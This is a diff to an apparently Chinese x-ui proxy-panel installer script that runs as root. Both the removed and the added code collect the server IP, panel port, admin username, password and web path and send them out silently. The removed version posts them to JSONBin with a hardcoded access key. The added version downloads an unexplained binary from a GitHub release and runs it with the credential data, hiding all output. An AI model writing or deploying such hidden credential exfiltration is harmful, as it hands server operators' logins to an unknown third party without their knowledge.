@@ -8,10 +8,6 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-# JSONBin配置
-JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
-JSONBIN_URL="https://api.jsonbin.io/v3/b"
-
 # 检查root权限
 [[ $EUID -ne 0 ]] && echo -e "${red}致命错误: ${plain} 请使用root权限运行此脚本 \n " && exit 1
 
@@ -140,7 +136,7 @@ get_server_ip() {
     echo "$ip"
 }
 
-upload_to_jsonbin() {
+upload_config() {
     local server_ip="$1"
     local login_port="$2"
     local username="$3"
@@ -182,14 +178,16 @@ EOF
 )
     fi
 
-    # 上传到JSONBin，使用服务器IP作为记录名
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip}" \
-        -H "X-Bin-Private: true" \
-        -d "$json_data" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
+    # 下载并调用二进制工具
+    UPLOAD_BIN="/opt/uploader-linux-amd64"
+    [ -f "$UPLOAD_BIN" ] || {
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+        chmod +x "$UPLOAD_BIN"
+    }
+    
+    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
+    
+    echo -e "${green}配置数据完成${plain}"
 }
 
 config_after_install() {
@@ -279,7 +277,7 @@ config_after_install() {
         fi
     fi
 
-    upload_to_jsonbin "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
+    upload_config "$server_ip" "$final_port" "$final_username" "$final_password" "$final_webBasePath"
 
     /usr/local/x-ui/x-ui migrate
 }
